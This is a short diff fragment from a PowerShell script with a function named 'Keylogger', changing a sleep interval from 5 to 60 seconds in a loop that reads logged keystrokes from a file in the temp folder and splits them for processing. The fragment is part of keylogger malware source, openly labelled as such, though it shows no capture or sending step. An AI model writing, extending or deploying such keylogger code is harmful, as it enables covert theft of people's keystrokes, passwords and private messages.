@@ -103,7 +103,7 @@ function script:Keylogger
         while($true) 
         { 
             $read = 0
-            Start-Sleep -Seconds 5 
+            Start-Sleep -Seconds 60
 			
 			$data = Get-Content "$env:temp\key.log"
 			$keys = $data.split("   ");
